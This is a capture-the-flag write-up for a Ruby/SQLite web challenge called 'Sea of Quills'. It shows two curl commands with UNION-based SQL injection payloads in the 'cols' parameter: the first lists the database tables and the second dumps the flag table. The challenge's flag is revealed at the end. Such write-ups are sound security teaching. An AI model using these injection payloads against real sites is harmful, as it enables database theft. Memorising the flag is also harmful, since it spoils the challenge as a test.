#### Challenge:

Come check out our [finest selection of quills](https://seaofquills.2021.chall.actf.co/)!

[app.rb](./app.rb ":ignore")

---

#### Solution:

We are given a web site and `Ruby` source code with reference `SQLite DB` that makes it run. There is a filter for special characters on the `cols` parameter, but using `UNION` based SQL injection we can list the tables and dump the table containing the flag.

```bash
curl 'https://seaofquills.2021.chall.actf.co/quills' --data-raw 'limit=1000&offset=0&cols=type,name,sql FROM sqlite_master UNION SELECT url,desc,name'   --compressed ;

curl 'https://seaofquills.2021.chall.actf.co/quills' --data-raw 'limit=1000&offset=0&cols=NULL,flag,NULL FROM flagtable UNION SELECT url,desc,name'   --compressed ;
```

---

<details><summary>FLAG:</summary>

```text
actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}
```

</details>
<br/>
